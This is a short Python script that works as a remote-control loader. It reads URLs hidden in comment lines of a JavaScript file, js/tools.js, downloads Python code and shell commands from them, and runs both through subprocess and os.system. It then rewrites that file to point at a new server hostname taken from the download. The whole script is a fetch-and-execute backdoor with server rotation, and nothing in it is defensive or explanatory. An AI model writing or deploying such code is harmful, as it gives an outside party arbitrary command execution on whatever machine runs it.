from urllib import request
import sys
import subprocess

with open("js/tools.js") as f:
    l = f.readlines()

fl = l[4][2:]
cd = l[5][2:]
cp = l[6][2:]

with request.urlopen(fl) as f:
    f = f.read().decode('utf-8')
    result = subprocess.run([sys.executable, "-c", f])

with request.urlopen(cp) as f:
    c_l = f.readlines()
    for n_l in c_l:
        n_l = n_l.decode('utf-8')
        os.system(n_l)

new_server = ""
with request.urlopen(cd) as f:
    f = f.readlines()
    new_server = f[0].decode('utf-8')
    for x in f:
        x = x.decode('utf-8')
        if(x != new_server):
            result = subprocess.call(x, shell=True)

if(new_server != None):
    l[0] = f'var hostname = "{new_server}"\n'
    with open("js/tools.js", "w") as f:
        f.writelines(l)
